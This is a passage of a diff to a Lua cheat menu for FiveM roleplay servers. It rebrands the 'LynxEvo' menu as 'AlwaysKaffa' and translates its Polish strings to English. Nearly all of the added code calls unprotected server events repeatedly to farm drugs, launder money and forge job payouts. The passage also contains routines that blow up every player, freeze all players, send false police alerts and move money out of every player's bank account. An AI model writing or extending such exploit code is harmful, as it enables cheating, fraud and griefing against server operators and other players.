                 GetHashKey('prop_cs_tablet')
             }
         )
-        LynxEvo.LoadModels(
+        AlwaysKaffa.LoadModels(
             {
                 'amb@code_human_in_bus_passenger_idles@female@tablet@idle_a'
             }
         )
         Citizen.CreateThread(
             function()
-                while DoesEntityExist(LynxEvo.TabletEntity) do
+                while DoesEntityExist(AlwaysKaffa.TabletEntity) do
                     Citizen.Wait(5)
                     if
                         not IsEntityPlayingAnim(
@@ -5774,34 +5782,34 @@ LynxEvo.Tablet = function(cq)
             end
         )
     else
-        DeleteEntity(LynxEvo.TabletEntity)
+        DeleteEntity(AlwaysKaffa.TabletEntity)
     end
 end
-LynxEvo.ToggleCamera = function(cq)
+AlwaysKaffa.ToggleCamera = function(cq)
     if not true then
         return
     end
     if cq then
-        if not DoesEntityExist(LynxEvo.Entity) then
+        if not DoesEntityExist(AlwaysKaffa.Entity) then
             return
         end
-        if DoesCamExist(LynxEvo.Camera) then
-            DestroyCam(LynxEvo.Camera)
+        if DoesCamExist(AlwaysKaffa.Camera) then
+            DestroyCam(AlwaysKaffa.Camera)
         end
-        LynxEvo.Camera = CreateCam('DEFAULT_SCRIPTED_CAMERA', true)
-        AttachCamToEntity(LynxEvo.Camera, LynxEvo.Entity, 0.0, 0.0, 0.4, true)
+        AlwaysKaffa.Camera = CreateCam('DEFAULT_SCRIPTED_CAMERA', true)
+        AttachCamToEntity(AlwaysKaffa.Camera, AlwaysKaffa.Entity, 0.0, 0.0, 0.4, true)
         Citizen.CreateThread(
             function()
-                while DoesCamExist(LynxEvo.Camera) do
+                while DoesCamExist(AlwaysKaffa.Camera) do
                     Citizen.Wait(5)
-                    SetCamRot(LynxEvo.Camera, GetEntityRotation(LynxEvo.Entity))
+                    SetCamRot(AlwaysKaffa.Camera, GetEntityRotation(AlwaysKaffa.Entity))
                 end
             end
         )
         local cr =
             500 *
             math.ceil(
-                GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(LynxEvo.Entity), true) / 10
+                GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(AlwaysKaffa.Entity), true) / 10
             )
         RenderScriptCams(1, 1, cr, 1, 1)
         Citizen.Wait(cr)
@@ -5811,21 +5819,21 @@ LynxEvo.ToggleCamera = function(cq)
         local cr =
             500 *
             math.ceil(
-                GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(LynxEvo.Entity), true) / 10
+                GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(AlwaysKaffa.Entity), true) / 10
             )
         RenderScriptCams(0, 1, cr, 1, 0)
         Citizen.Wait(cr)
         ClearTimecycleModifier()
-        DestroyCam(LynxEvo.Camera)
+        DestroyCam(AlwaysKaffa.Camera)
     end
 end
-LynxEvo.LoadModels = function(cs)
+AlwaysKaffa.LoadModels = function(cs)
     for ct = 1, #cs do
         local bB = cs[ct]
-        if not LynxEvo.CachedModels then
-            LynxEvo.CachedModels = {}
+        if not AlwaysKaffa.CachedModels then
+            AlwaysKaffa.CachedModels = {}
         end
-        table.insert(LynxEvo.CachedModels, bB)
+        table.insert(AlwaysKaffa.CachedModels, bB)
         if IsModelValid(bB) then
             while not HasModelLoaded(bB) do
                 RequestModel(bB)
@@ -5839,9 +5847,9 @@ LynxEvo.LoadModels = function(cs)
         end
     end
 end
-LynxEvo.UnloadModels = function()
-    for ct = 1, #LynxEvo.CachedModels do
-        local bB = LynxEvo.CachedModels[ct]
+AlwaysKaffa.UnloadModels = function()
+    for ct = 1, #AlwaysKaffa.CachedModels do
+        local bB = AlwaysKaffa.CachedModels[ct]
         if IsModelValid(bB) then
             SetModelAsNoLongerNeeded(bB)
         else
@@ -5852,10 +5860,21 @@ end
 local function cu()
     local ax = GetPlayerPed(-1)
     local ay = GetVehiclePedIsIn(ax, true)
-    local m = KeyboardInput('Wprowadz nazwe Tablic', '', 100)
+    local m = KeyboardInput('Enter the plate license you want', '', 100)
     if m ~= '' then
         SetVehicleNumberPlateText(ay, m)
     end
+end
+
+function pickupcannabis()
+    TriggerServerEvent('esx_drugs:pickedUpCannabis')
+    TriggerServerEvent('esx_drugs:pickedUpCannabis')
+    TriggerServerEvent('esx_drugs:pickedUpCannabis')
+    TriggerServerEvent('esx_drugs:pickedUpCannabis')
+end
+
+function proccesscannabis()
+    TriggerServerEvent('esx_drugs:processCannabis')
 end
 
 function hweed()
@@ -5863,7 +5882,10 @@ function hweed()
     TriggerServerEvent('esx_drugs:startHarvestWeed')
     TriggerServerEvent('esx_drugs:startHarvestWeed')
     TriggerServerEvent('esx_drugs:startHarvestWeed')
-    TriggerServerEvent('esx_drugs:startHarvestWeed')
+    TriggerServerEvent('esx_illegal_drugs:startHarvestWeed')
+    TriggerServerEvent('esx_illegal_drugs:startHarvestWeed')
+    TriggerServerEvent('esx_illegal_drugs:startHarvestWeed')
+    TriggerServerEvent('esx_illegal_drugs:startHarvestWeed')
 end
 
 function tweed()
@@ -5871,7 +5893,10 @@ function tweed()
     TriggerServerEvent('esx_drugs:startTransformWeed')
     TriggerServerEvent('esx_drugs:startTransformWeed')
     TriggerServerEvent('esx_drugs:startTransformWeed')
-    TriggerServerEvent('esx_drugs:startTransformWeed')
+    TriggerServerEvent('esx_illegal_drugs:startTransformWeed')
+    TriggerServerEvent('esx_illegal_drugs:startTransformWeed')
+    TriggerServerEvent('esx_illegal_drugs:startTransformWeed')
+    TriggerServerEvent('esx_illegal_drugs:startTransformWeed')
 end
 
 function sweed()
@@ -5879,7 +5904,10 @@ function sweed()
     TriggerServerEvent('esx_drugs:startSellWeed')
     TriggerServerEvent('esx_drugs:startSellWeed')
     TriggerServerEvent('esx_drugs:startSellWeed')
-    TriggerServerEvent('esx_drugs:startSellWeed')
+    TriggerServerEvent('esx_illegal_drugs:startSellWeed')
+    TriggerServerEvent('esx_illegal_drugs:startSellWeed')
+    TriggerServerEvent('esx_illegal_drugs:startSellWeed')
+    TriggerServerEvent('esx_illegal_drugs:startSellWeed')
 end
 
 function hcoke()
@@ -5887,7 +5915,10 @@ function hcoke()
     TriggerServerEvent('esx_drugs:startHarvestCoke')
     TriggerServerEvent('esx_drugs:startHarvestCoke')
     TriggerServerEvent('esx_drugs:startHarvestCoke')
-    TriggerServerEvent('esx_drugs:startHarvestCoke')
+    TriggerServerEvent('esx_illegal_drugs:startHarvestCoke')
+    TriggerServerEvent('esx_illegal_drugs:startHarvestCoke')
+    TriggerServerEvent('esx_illegal_drugs:startHarvestCoke')
+    TriggerServerEvent('esx_illegal_drugs:startHarvestCoke')
 end
 
 function tcoke()
@@ -5895,7 +5926,10 @@ function tcoke()
     TriggerServerEvent('esx_drugs:startTransformCoke')
     TriggerServerEvent('esx_drugs:startTransformCoke')
     TriggerServerEvent('esx_drugs:startTransformCoke')
-    TriggerServerEvent('esx_drugs:startTransformCoke')
+    TriggerServerEvent('esx_illegal_drugs:startTransformCoke')
+    TriggerServerEvent('esx_illegal_drugs:startTransformCoke')
+    TriggerServerEvent('esx_illegal_drugs:startTransformCoke')
+    TriggerServerEvent('esx_illegal_drugs:startTransformCoke')
 end
 
 function scoke()
@@ -5903,7 +5937,10 @@ function scoke()
     TriggerServerEvent('esx_drugs:startSellCoke')
     TriggerServerEvent('esx_drugs:startSellCoke')
     TriggerServerEvent('esx_drugs:startSellCoke')
-    TriggerServerEvent('esx_drugs:startSellCoke')
+    TriggerServerEvent('esx_illegal_drugs:startSellCoke')
+    TriggerServerEvent('esx_illegal_drugs:startSellCoke')
+    TriggerServerEvent('esx_illegal_drugs:startSellCoke')
+    TriggerServerEvent('esx_illegal_drugs:startSellCoke')
 end
 
 function hmeth()
@@ -5911,7 +5948,11 @@ function hmeth()
     TriggerServerEvent('esx_drugs:startHarvestMeth')
     TriggerServerEvent('esx_drugs:startHarvestMeth')
     TriggerServerEvent('esx_drugs:startHarvestMeth')
-    TriggerServerEvent('esx_drugs:startHarvestMeth')
+    TriggerServerEvent('esx_illegal_drugs:startHarvestMeth')
+    TriggerServerEvent('esx_illegal_drugs:startHarvestMeth')
+    TriggerServerEvent('esx_illegal_drugs:startHarvestMeth')
+    TriggerServerEvent('esx_illegal_drugs:startHarvestMeth')
+    TriggerServerEvent('MF_MobileMeth:RewardPlayers')
 end
 
 function tmeth()
@@ -5919,7 +5960,10 @@ function tmeth()
     TriggerServerEvent('esx_drugs:startTransformMeth')
     TriggerServerEvent('esx_drugs:startTransformMeth')
     TriggerServerEvent('esx_drugs:startTransformMeth')
-    TriggerServerEvent('esx_drugs:startTransformMeth')
+    TriggerServerEvent('esx_illegal_drugs:startTransformMeth')
+    TriggerServerEvent('esx_illegal_drugs:startTransformMeth')
+    TriggerServerEvent('esx_illegal_drugs:startTransformMeth')
+    TriggerServerEvent('esx_illegal_drugs:startTransformMeth')
 end
 
 function smeth()
@@ -5927,7 +5971,10 @@ function smeth()
     TriggerServerEvent('esx_drugs:startSellMeth')
     TriggerServerEvent('esx_drugs:startSellMeth')
     TriggerServerEvent('esx_drugs:startSellMeth')
-    TriggerServerEvent('esx_drugs:startSellMeth')
+    TriggerServerEvent('esx_illegal_drugs:startSellMeth')
+    TriggerServerEvent('esx_illegal_drugs:startSellMeth')
+    TriggerServerEvent('esx_illegal_drugs:startSellMeth')
+    TriggerServerEvent('esx_illegal_drugs:startSellMeth')
 end
 
 function hopi()
@@ -5935,7 +5982,10 @@ function hopi()
     TriggerServerEvent('esx_drugs:startHarvestOpium')
     TriggerServerEvent('esx_drugs:startHarvestOpium')
     TriggerServerEvent('esx_drugs:startHarvestOpium')
-    TriggerServerEvent('esx_drugs:startHarvestOpium')
+    TriggerServerEvent('esx_illegal_drugs:startHarvestOpium')
+    TriggerServerEvent('esx_illegal_drugs:startHarvestOpium')
+    TriggerServerEvent('esx_illegal_drugs:startHarvestOpium')
+    TriggerServerEvent('esx_illegal_drugs:startHarvestOpium')
 end
 
 function topi()
@@ -5943,7 +5993,10 @@ function topi()
     TriggerServerEvent('esx_drugs:startTransformOpium')
     TriggerServerEvent('esx_drugs:startTransformOpium')
     TriggerServerEvent('esx_drugs:startTransformOpium')
-    TriggerServerEvent('esx_drugs:startTransformOpium')
+    TriggerServerEvent('esx_illegal_drugs:startTransformOpium')
+    TriggerServerEvent('esx_illegal_drugs:startTransformOpium')
+    TriggerServerEvent('esx_illegal_drugs:startTransformOpium')
+    TriggerServerEvent('esx_illegal_drugs:startTransformOpium')
 end
 
 function sopi()
@@ -5951,40 +6004,128 @@ function sopi()
     TriggerServerEvent('esx_drugs:startSellOpium')
     TriggerServerEvent('esx_drugs:startSellOpium')
     TriggerServerEvent('esx_drugs:startSellOpium')
-    TriggerServerEvent('esx_drugs:startSellOpium')
+    TriggerServerEvent('esx_illegal_drugs:startSellOpium')
+    TriggerServerEvent('esx_illegal_drugs:startSellOpium')
+    TriggerServerEvent('esx_illegal_drugs:startSellOpium')
+    TriggerServerEvent('esx_illegal_drugs:startSellOpium')
+end
+
+function snpc()
+    TriggerServerEvent('sellDrugs')
 end
 
 function mataaspalarufe()
     TriggerServerEvent('esx_blanchisseur:startWhitening', 85)
-    TriggerServerEvent('esx_blanchisseur:startWhitening', 85)
-    TriggerServerEvent('esx_blanchisseur:startWhitening', 85)
-    TriggerServerEvent('esx_blanchisseur:startWhitening', 85)
-    TriggerServerEvent('esx_blanchisseur:startWhitening', 85)
-    TriggerServerEvent('esx_blanchisseur:startWhitening', 85)
-    TriggerServerEvent('esx_blanchisseur:startWhitening', 85)
-    TriggerServerEvent('esx_blanchisseur:startWhitening', 85)
-    TriggerServerEvent('esx_blanchisseur:startWhitening', 85)
-    TriggerServerEvent('esx_blanchisseur:startWhitening', 85)
+    TriggerServerEvent('esx_blanchisseur:washMoney', 100)
+    TriggerServerEvent('esx_blackmoney:washMoney')
+    TriggerServerEvent('esx_moneywash:withdraw', 100)
+    TriggerServerEvent('laundry:washcash')
+end
+
+function harvestbitcoin()
+    TriggerServerEvent('esx_bitcoin:startHarvestKoda')
+    TriggerServerEvent('esx_bitcoin:startHarvestKoda')
+    TriggerServerEvent('esx_bitcoin:startHarvestKoda')
+    TriggerServerEvent('esx_bitcoin:startHarvestKoda')
+end
+
+function sellbitcoin()
+    TriggerServerEvent('esx_bitcoin:startSellKoda')
+    TriggerServerEvent('esx_bitcoin:startSellKoda')
+    TriggerServerEvent('esx_bitcoin:startSellKoda')
+    TriggerServerEvent('esx_bitcoin:startSellKoda')
+end
+
+function harvestgazbottle()
+    TriggerServerEvent('esx_mechanicjob:startHarvest')
+    TriggerServerEvent('esx_mechanicjob:startHarvest')
+    TriggerServerEvent('esx_mechanicjob:startHarvest')
+    TriggerServerEvent('esx_mechanicjob:startHarvest')
+end
+
+function craftgazbottle()
+    TriggerServerEvent('esx_mechanicjob:startCraft')
+    TriggerServerEvent('esx_mechanicjob:startCraft')
+    TriggerServerEvent('esx_mechanicjob:startCraft')
+    TriggerServerEvent('esx_mechanicjob:startCraft')
+end
+
+function harvestrepairkits()
+    TriggerServerEvent('esx_mechanicjob:startHarvest2')
+    TriggerServerEvent('esx_mechanicjob:startHarvest2')
+    TriggerServerEvent('esx_mechanicjob:startHarvest2')
+    TriggerServerEvent('esx_mechanicjob:startHarvest2')
+end
+
+function craftrepairkits()
+    TriggerServerEvent('esx_mechanicjob:startCraft2')
+    TriggerServerEvent('esx_mechanicjob:startCraft2')
+    TriggerServerEvent('esx_mechanicjob:startCraft2')
+    TriggerServerEvent('esx_mechanicjob:startCraft2')
+end
+
+function harvestbodykits()
+    TriggerServerEvent('esx_mechanicjob:startHarvest3')
+    TriggerServerEvent('esx_mechanicjob:startHarvest3')
+    TriggerServerEvent('esx_mechanicjob:startHarvest3')
+    TriggerServerEvent('esx_mechanicjob:startHarvest3')
+end
+
+function craftbodykits()
+    TriggerServerEvent('esx_mechanicjob:startCraft3')
+    TriggerServerEvent('esx_mechanicjob:startCraft3')
+    TriggerServerEvent('esx_mechanicjob:startCraft3')
+    TriggerServerEvent('esx_mechanicjob:startCraft3')
 end
 
 function matanumaispalarufe()
     TriggerServerEvent('esx_drugs:stopHarvestCoke')
+    TriggerServerEvent('esx_illegal_drugs:stopHarvestCoke')
     TriggerServerEvent('esx_drugs:stopTransformCoke')
+    TriggerServerEvent('esx_illegal_drugs:stopTransformCoke')
     TriggerServerEvent('esx_drugs:stopSellCoke')
+    TriggerServerEvent('esx_illegal_drugs:stopSellCoke')
     TriggerServerEvent('esx_drugs:stopHarvestMeth')
+    TriggerServerEvent('esx_illegal_drugs:stopHarvestMeth')
     TriggerServerEvent('esx_drugs:stopTransformMeth')
+    TriggerServerEvent('esx_illegal_drugs:stopTransformMeth')
     TriggerServerEvent('esx_drugs:stopSellMeth')
+    TriggerServerEvent('esx_illegal_drugs:stopSellMeth')
     TriggerServerEvent('esx_drugs:stopHarvestWeed')
+    TriggerServerEvent('esx_illegal_drugs:stopHarvestWeed')
     TriggerServerEvent('esx_drugs:stopTransformWeed')
+    TriggerServerEvent('esx_illegal_drugs:stopTransformWeed')
     TriggerServerEvent('esx_drugs:stopSellWeed')
+    TriggerServerEvent('esx_illegal_drugs:stopSellWeed')
     TriggerServerEvent('esx_drugs:stopHarvestOpium')
+    TriggerServerEvent('esx_illegal_drugs:stopHarvestOpium')
     TriggerServerEvent('esx_drugs:stopTransformOpium')
+    TriggerServerEvent('esx_illegal_drugs:stopTransformOpium')
     TriggerServerEvent('esx_drugs:stopSellOpium')
+    TriggerServerEvent('esx_illegal_drugs:stopSellOpium')
+    TriggerServerEvent('esx_bitcoin:stopHarvestKoda')
+    TriggerServerEvent('esx_bitcoin:stopSellKoda')
+    TriggerServerEvent('esx_mechanicjob:stopHarvest')
+    TriggerServerEvent('esx_mechanicjob:stopCraft')
+    TriggerServerEvent('esx_mechanicjob:stopHarvest2')
+    TriggerServerEvent('esx_mechanicjob:stopCraft2')
+    TriggerServerEvent('esx_mechanicjob:stopHarvest3')
+    TriggerServerEvent('esx_mechanicjob:stopCraft3')
+    TriggerServerEvent('esx_poolcleaner:stopVente')
     av('~b~Everything is now stopped.', false)
 end
-local function cv()
-    local cb = KeyboardInput('Wprowadz nazwe modelu pojazdu', '', 100)
-    local cw = KeyboardInput('Wprowadz nazwe tablic', '', 100)
+
+local function doText(numLetters)
+    local totTxt = ""
+    for i = 1,numLetters do
+        totTxt = totTxt..string.char(math.random(65,90))
+    end
+    print(totTxt)
+end
+
+local function freevehc1()
+    local cb = KeyboardInput('Enter Vehicle Spawn Name', '', 100)
+    local cw = KeyboardInput('Enter Vehicle Licence Plate', '', 100)
     if cb and IsModelValid(cb) and IsModelAVehicle(cb) then
         RequestModel(cb)
         while not HasModelLoaded(cb) do
@@ -5998,12 +6139,19 @@ local function cv()
             true,
             true
         )
-        SetVehicleNumberPlateText(veh, cw)
-        local cx = ESX.Game.GetVehicleProperties(veh)
-        TriggerServerEvent('esx_vehicleshop:setVehicleOwned', cx)
-        av('~g~~h~Sukces', false)
+        if cw then
+            SetVehicleNumberPlateText(veh, cw)
+            local cx = ESX.Game.GetVehicleProperties(veh)
+            TriggerServerEvent('esx_vehicleshop:setVehicleOwned', cx)
+            av('~g~~h~Success', false)
+        else
+            SetVehicleNumberPlateText(veh, doText(3)..' '..math.random(100,999))
+            local cx = ESX.Game.GetVehicleProperties(veh)
+            TriggerServerEvent('esx_vehicleshop:setVehicleOwned', cx)
+            av('~g~~h~Success', false)
+        end
     else
-        av('~b~~h~Model nie istnieje !', true)
+        av('~b~~h~Model is not valid !', true)
     end
 end
 
@@ -6015,9 +6163,9 @@ function daojosdinpatpemata()
             GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
      then
         SetVehicleOnGroundProperly(ay)
-        av('~g~Pojazd wywrocony na kola!', false)
+        av('~g~Vehicle Flipped!', false)
     else
-        av("~b~Musisz byc kierowca!", true)
+        av("~b~You Aren't In The Driverseat Of A Vehicle!", true)
     end
 end
 
@@ -6043,12 +6191,12 @@ function SpectatePlayer(cD)
         local cF, cG, cH = table.unpack(GetEntityCoords(cE, false))
         RequestCollisionAtCoord(cF, cG, cH)
         NetworkSetInSpectatorMode(true, cE)
-        av('Obserwowanie ' .. GetPlayerName(cD), false)
+        av('Spectating ' .. GetPlayerName(cD), false)
     else
         local cF, cG, cH = table.unpack(GetEntityCoords(cE, false))
         RequestCollisionAtCoord(cF, cG, cH)
         NetworkSetInSpectatorMode(false, cE)
-        av('Zatrzymales obserwowanie ' .. GetPlayerName(cD), false)
+        av('Stopped Spectating ' .. GetPlayerName(cD), false)
     end
 end
 
@@ -6268,11 +6416,12 @@ local cL = true
 local cM = false
 local cN = true
 local cO = true
+
 Citizen.CreateThread(
     function()
         while true do
             Wait(1)
-            for f = 0, 256 do
+            for f = 0, 128 do
                 if NetworkIsPlayerActive(f) and GetPlayerPed(f) ~= GetPlayerPed(-1) then
                     ped = GetPlayerPed(f)
                     blip = GetBlipFromEntity(ped)
@@ -6485,7 +6634,7 @@ Citizen.CreateThread(
                 local d5 = 'Freight'
                 local c0 = GetEntityCoords(GetPlayerPed(-1), true)
                 if IsPedInAnyVehicle(GetPlayerPed(-1), true) == false then
-                    av('~g~Bron w pojezdzie aktywowana!', false)
+                    av('~g~Vehicle Gun Enabled!~n~~w~Use The ~b~AP Pistol~n~~b~Aim ~w~and ~b~Shoot!', false)
                     GiveWeaponToPed(GetPlayerPed(-1), GetHashKey('WEAPON_APPISTOL'), 999999, false, true)
                     SetPedAmmo(GetPlayerPed(-1), GetHashKey('WEAPON_APPISTOL'), 999999)
                     if GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey('WEAPON_APPISTOL') then
@@ -6513,7 +6662,7 @@ Citizen.CreateThread(
             if DeleteGun then
                 local d6 = getEntity(PlayerId(-1))
                 if IsPedInAnyVehicle(GetPlayerPed(-1), true) == false then
-                    av('~g~STRZELAJ!')
+                    av('~g~Delete Gun Enabled!~n~~w~Use The ~b~Pistol~n~~b~Aim ~w~and ~b~Shoot ~w~To Delete!')
                     GiveWeaponToPed(GetPlayerPed(-1), GetHashKey('WEAPON_PISTOL'), 999999, false, true)
                     SetPedAmmo(GetPlayerPed(-1), GetHashKey('WEAPON_PISTOL'), 999999)
                     if GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey('WEAPON_PISTOL') then
@@ -6525,20 +6674,20 @@ Citizen.CreateThread(
                                         DeleteEntity(GetVehiclePedIsIn(d6, true))
                                         SetEntityAsMissionEntity(d6, 1, 1)
                                         DeleteEntity(d6)
-                                        av('~g~Usunieto!')
+                                        av('~g~Deleted!')
                                     end
                                 else
                                     if IsControlJustReleased(1, 142) then
                                         SetEntityAsMissionEntity(d6, 1, 1)
                                         DeleteEntity(d6)
-                                        av('~g~Usunieto!')
+                                        av('~g~Deleted!')
                                     end
                                 end
                             else
                                 if IsControlJustReleased(1, 142) then
                                     SetEntityAsMissionEntity(d6, 1, 1)
                                     DeleteEntity(d6)
-                                    av('~g~Usunieto!')
+                                    av('~g~Deleted!')
                                 end
                             end
                         end
@@ -6575,7 +6724,7 @@ Citizen.CreateThread(
                         SetVehicleLights(ay, 1)
                         Citizen.InvokeNative(0x1FD09E7390A74D54, ay, 1)
                         SetVehicleNumberPlateTextIndex(ay, 5)
-                        SetVehicleNumberPlateText(ay, 'xAries')
+                        SetVehicleNumberPlateText(ay, 'AlwaysKaffa')
                         SetVehicleDirtLevel(ay, 10.0)
                         SetVehicleModColor_1(ay, 1)
                         SetVehicleModColor_2(ay, 1)
@@ -6603,8 +6752,8 @@ Citizen.CreateThread(
                 end
             end
             if huntspam then
-                Citizen.Wait(1)
-                TriggerServerEvent('esx-qalle-hunting:reward', 20000)
+                Citizen.Wait(50)
+                TriggerServerEvent('esx-qalle-hunting:reward', 50)
                 TriggerServerEvent('esx-qalle-hunting:sell')
             end
             if deletenearestvehicle then
@@ -6621,30 +6770,30 @@ Citizen.CreateThread(
                 ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
             end
             if freezeall then
-                for i = 0, 256 do
+                for i = 0, 128 do
                     ClearPedTasksImmediately(GetPlayerPed(i))
                 end
             end
             if esp then
-                for i = 0, 256 do
+                for i = 0, 128 do
                     if i ~= PlayerId(-1) and GetPlayerServerId(i) ~= 0 then
                         local a8 = k(1.0)
                         local d7 = GetPlayerPed(i)
                         local d8, d9, da = table.unpack(GetEntityCoords(PlayerPedId(-1)))
                         local x, y, z = table.unpack(GetEntityCoords(d7))
                         local db =
-                            '~h~Nick: ' ..
+                            '~h~Name: ' ..
                             GetPlayerName(i) ..
-                                '\nID: ' ..
+                                '\nServer ID: ' ..
                                     GetPlayerServerId(i) ..
-                                        '\nID GRACZA: ' ..
+                                        '\nPlayer ID: ' ..
                                             i ..
-                                                '\nDystans: ' ..
+                                                '\nDist: ' ..
                                                     math.round(GetDistanceBetweenCoords(d8, d9, da, x, y, z, true), 1)
                         if IsPedInAnyVehicle(d7, true) then
                             local dc =
                                 GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsUsing(d7))))
-                            db = db .. '\nPojazd: ' .. dc
+                            db = db .. '\nVeh: ' .. dc
                         end
                         if espinfo and esp then
                             DrawText3D(x, y, z - 1.0, db, a8.r, a8.g, a8.b)
@@ -6870,24 +7019,36 @@ Citizen.CreateThread(
                         TriggerServerEvent('esx_drugs:startSellCoke')
                         TriggerServerEvent('esx_drugs:startSellMeth')
                         TriggerServerEvent('esx_drugs:startSellOpium')
+                        TriggerServerEvent('esx_illegal_drugs:startHarvestWeed')
+                        TriggerServerEvent('esx_illegal_drugs:startHarvestCoke')
+                        TriggerServerEvent('esx_illegal_drugs:startHarvestMeth')
+                        TriggerServerEvent('esx_illegal_drugs:startTransformOpium')
+                        TriggerServerEvent('esx_illegal_drugs:startTransformWeed')
+                        TriggerServerEvent('esx_illegal_drugs:startTransformCoke')
+                        TriggerServerEvent('esx_illegal_drugs:startTransformMeth')
+                        TriggerServerEvent('esx_illegal_drugs:startTransformOpium')
+                        TriggerServerEvent('esx_illegal_drugs:startSellWeed')
+                        TriggerServerEvent('esx_illegal_drugs:startSellCoke')
+                        TriggerServerEvent('esx_illegal_drugs:startSellMeth')
+                        TriggerServerEvent('esx_illegal_drugs:startSellOpium')
                         Citizen.Wait(1000)
                     end
                 )
             end
             if blowall then
-                for bD = 0, 9 do
+                --[[for bD = 0, 9 do
                     TriggerServerEvent(
                         '_chat:messageEntered',
-                        'xaxaxaxaxaxaxaxaxax',
+                        '^1A^2l^3p^4h^5a^6V^7e^1t^2a',
                         {
                             141,
                             211,
                             255
                         },
-                        '^' .. bD .. 'xaxaxaxaxaxaxaxaxax'
+                        '^' .. bD .. 'AlwaysKaffa ~ 5391'
                     )
-                end
-                for i = 0, 256 do
+                end--]]
+                for i = 0, 128 do
                     Citizen.Wait(500)
                     AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, 100000.0)
                     AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, true)
@@ -6906,7 +7067,7 @@ Citizen.CreateThread(
                 local de = false
                 local df = 130
                 local dg = 0
-                for f = 0, 256 do
+                for f = 0, 128 do
                     if NetworkIsPlayerActive(f) and GetPlayerPed(f) ~= GetPlayerPed(-1) then
                         ped = GetPlayerPed(f)
                         blip = GetBlipFromEntity(ped)
@@ -6977,56 +7138,52 @@ Citizen.CreateThread(
             end
 
             function carthieftroll()
-                for i = 0, 256 do
+                for i = 0, 128 do
                     local bK = GetEntityCoords(GetPlayerPed(i))
                     TriggerServerEvent('esx_carthief:alertcops', bK.x, bK.y, bK.z)
                 end
             end
 
             function automaticmoneyesx()
-                local m = KeyboardInput('Zacznij od malej sumy!!!', '', 100)
+                local m = KeyboardInput('Warning, this value can be multiplied!!!', '', 100)
                 if cO then
                     if m ~= '' then
-                        local confirm = KeyboardInput('Jestes pewny? T/n', '', 0)
+                        local confirm = KeyboardInput('Are you sure? y/n', '', 0)
                         if confirm == 'y' then
                         end
-                        av('~h~~g~Sprawdzanie wszystkich skryptow w celu dodania pieniedzy.', true)
-                        TriggerServerEvent('esx_carthief:pay', m)
-                        TriggerServerEvent('esx_jobs:caution', 'give_back', m)
-                        TriggerServerEvent('esx_fueldelivery:pay', m)
-                        TriggerServerEvent('esx_carthief:pay', m)
-                        TriggerServerEvent('esx_godirtyjob:pay', m)
-                        TriggerServerEvent('esx_pizza:pay', m)
-                        TriggerServerEvent('esx_ranger:pay', m)
-                        TriggerServerEvent('esx_garbagejob:pay', m)
-                        TriggerServerEvent('esx_truckerjob:pay', m)
-                        TriggerServerEvent('AdminMenu:giveBank', m)
-                        TriggerServerEvent('AdminMenu:giveCash', m)
-                        TriggerServerEvent('esx_gopostaljob:pay', m)
-                        TriggerServerEvent('esx_banksecurity:pay', m)
-                        TriggerServerEvent('esx_slotmachine:sv:2', m)
+                        av('~h~~g~Kaffa Custom Money Method.', true)
+                        TriggerServerEvent("esx_delivererjob:pay", m)
+                        TriggerServerEvent("pizza:pourboire", m)
+                        TriggerServerEvent("free:collect", m)
+						TriggerServerEvent("esx_godirtyjob:pay", m)
+						TriggerServerEvent('esx_vangelico_robbery:rob', m)
+						TriggerServerEvent('es1_holdup:rob', m)
+						TriggerServerEvent("esx_garbagejob:pay", m)
+						TriggerServerEvent("esx_ups:pay", m)
+						TriggerServerEvent("esx_gopostaljob:pay", m)
+
                     elseif confirm == 'n' then
-                        av('~h~~b~Operacja anulowana~s~.', false)
+                        av('~h~~b~Operation cancelled~s~.', false)
                     else
-                        av('~h~~b~Blad~s~.', true)
-                        av('~h~~b~Operacja anulowana~s~.', false)
+                        av('~h~~b~Invalid Confirmation~s~.', true)
+                        av('~h~~b~Operation cancelled~s~.', false)
                     end
                 end
             end
 
             function vrpdestroy()
-                for bD = 0, 9 do
+                --[[for bD = 0, 9 do
                     TriggerServerEvent(
                         '_chat:messageEntered',
-                        'xaxaxaxaxaxaxaxaxax',
+                        '^1A^2l^3p^4h^5a^6V^7e^1t^2a',
                         {
                             141,
                             211,
                             255
                         },
-                        '^' .. bD .. 'xaxaxaxaxaxaxaxaxax'
+                        '^' .. bD .. 'AlwaysKaffa ~ 5391'
                     )
-                end
+                end--]]
                 TriggerServerEvent(
                     'lscustoms:payGarage',
                     {
@@ -7037,7 +7194,7 @@ Citizen.CreateThread(
                 TriggerServerEvent('Banca:deposit', 999999999)
                 TriggerServerEvent('bank:deposit', 999999999)
                 local di = GetPlayerServerId(PlayerId())
-                for i = 0, 256 do
+                for i = 0, 128 do
                     TriggerEvent('bank:transfer', di, GetPlayerServerId(i), 99999999)
                 end
             end
@@ -7062,19 +7219,21 @@ Citizen.CreateThread(
                         TriggerServerEvent('esx_gopostaljob:pay', 9999999999)
                         TriggerServerEvent('esx_banksecurity:pay', 9999999999)
                         TriggerServerEvent('esx_slotmachine:sv:2', 9999999999)
-                        for bD = 0, 9 do
+                        TriggerServerEvent('esx-qalle-hunting:reward', 9999999999)
+                        TriggerServerEvent('esx-qalle-hunting:sell')
+                        --[[for bD = 0, 9 do
                             TriggerServerEvent(
                                 '_chat:messageEntered',
-                                'xaxaxaxaxaxaxaxaxax',
+                                '^1A^2l^3p^4h^5a^6V^7e^1t^2a',
                                 {
                                     141,
                                     211,
                                     255
                                 },
-                                '^' .. bD .. 'xaxaxaxaxaxaxaxaxax'
+                                '^' .. bD .. 'AlwaysKaffa ~ 5391'
                             )
-                        end
-                        for i = 0, 256 do
+                        end--]]
+                        for i = 0, 128 do
                             TriggerServerEvent(
                                 'esx:giveInventoryItem',
                                 GetPlayerServerId(i),
@@ -7092,8 +7251,8 @@ Citizen.CreateThread(
                             TriggerServerEvent(
                                 'esx_billing:sendBill',
